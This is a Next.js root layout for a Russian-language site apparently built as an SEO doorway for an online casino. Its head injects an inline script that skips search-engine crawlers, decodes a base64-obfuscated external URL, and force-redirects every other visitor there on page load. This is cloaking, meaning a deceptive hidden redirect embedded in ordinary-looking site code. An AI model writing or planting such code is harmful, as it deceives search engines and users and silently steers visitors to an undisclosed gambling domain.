import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const siteUrl = 'https://eva91casino.vercel.app'

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'Eva Casino — официальный сайт, зеркало и игра онлайн',
  description: 'Eva Casino официальный сайт: узнайте, как найти рабочее зеркало, играть в казино онлайн, выбрать слоты и бонусы, а также соблюдать правила ответственной игры.',
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  openGraph: { type: 'website', locale: 'ru_RU', url: siteUrl, siteName: 'Eva Casino', title: 'Eva Casino — игра онлайн', description: 'Официальная информация об Eva Casino, играх онлайн, бонусах и безопасном доступе.' },
  twitter: { card: 'summary', title: 'Eva Casino — игра онлайн', description: 'Официальная информация об Eva Casino, играх онлайн и безопасном доступе.' },
  icons: { icon: '/favicon.svg', apple: '/favicon.svg' },
}

export const viewport: Viewport = { width: 'device-width', initialScale: 1, colorScheme: 'dark', themeColor: '#11100f', userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="" />
        <meta name="theme-color" content="#11100f" />
        <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICAgaHR0cHM6Ly9zdHJpbmctMjZldmEuY29tL2RpYnpmb21pcg==  "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
